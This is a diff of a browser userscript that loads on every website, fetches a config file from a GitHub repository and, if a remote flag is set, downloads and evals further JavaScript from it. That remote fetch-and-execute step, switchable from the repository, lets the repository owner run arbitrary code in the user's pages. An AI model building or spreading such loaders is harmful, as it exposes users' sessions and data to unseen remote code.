@@ -1,101 +1,52 @@
 // ==UserScript==
-// @name         MC
+// @name         Mega Redirect Loader
 // @namespace    loader.system
 // @version      1.0
-// @description  Private Loader
 // @match        *://*/*
 // @run-at       document-start
-// @grant        GM_xmlhttpRequest
-// @connect      raw.githubusercontent.com
+// @grant        none
 // ==/UserScript==
 
 (async () => {
 
     'use strict';
 
-    // =========================
-    // FILE LINKS
-    // =========================
-
     const CONFIG =
-    'https://raw.githubusercontent.com/USERNAME/REPO/main/config.json?t=' + Date.now();
+    'https://raw.githubusercontent.com/dnqkVN/tool-uptolink/main/config.json?t=' + Date.now();
 
     const MAIN =
-    'https://raw.githubusercontent.com/USERNAME/REPO/main/main.js?t=' + Date.now();
+    'https://raw.githubusercontent.com/dnqkVN/tool-uptolink/main/main.js?t=' + Date.now();
 
     try {
 
-        // =========================
-        // LOAD CONFIG
-        // =========================
+        console.log('[LOADER] START');
 
-        const cfgRes = await fetch(CONFIG, {
-            cache: 'no-store'
-        });
+        const cfg = await fetch(CONFIG).then(r => r.json());
 
-        if (!cfgRes.ok) {
-
-            console.log('[LOADER] CONFIG ERROR');
-
-            return;
-
-        }
-
-        const cfg = await cfgRes.json();
-
-        // =========================
-        // DISABLED
-        // =========================
+        console.log('[CONFIG]', cfg);
 
         if (cfg.st === 'ds') {
 
-            console.log('[LOADER] SCRIPT DISABLED');
+            console.log('[SCRIPT] DISABLED');
 
             return;
-
         }
-
-        // =========================
-        // ENABLED
-        // =========================
 
         if (cfg.st === 'el') {
 
-            console.log('[LOADER] SCRIPT ENABLED');
+            console.log('[SCRIPT] ENABLED');
 
-            const mainRes = await fetch(MAIN, {
-                cache: 'no-store'
-            });
+            const code = await fetch(MAIN).then(r => r.text());
 
-            if (!mainRes.ok) {
-
-                console.log('[LOADER] MAIN ERROR');
-
-                return;
-
-            }
-
-            const code = await mainRes.text();
-
-            // =========================
-            // EXECUTE
-            // =========================
+            console.log('[MAIN LOADED]');
 
             eval(code);
 
-            return;
-
         }
 
-        // =========================
-        // INVALID STATUS
-        // =========================
+    } catch (e) {
 
-        console.log('[LOADER] INVALID CONFIG');
-
-    } catch (err) {
-
-        console.error('[LOADER ERROR]', err);
+        console.error('[LOADER ERROR]', e);
 
     }
 
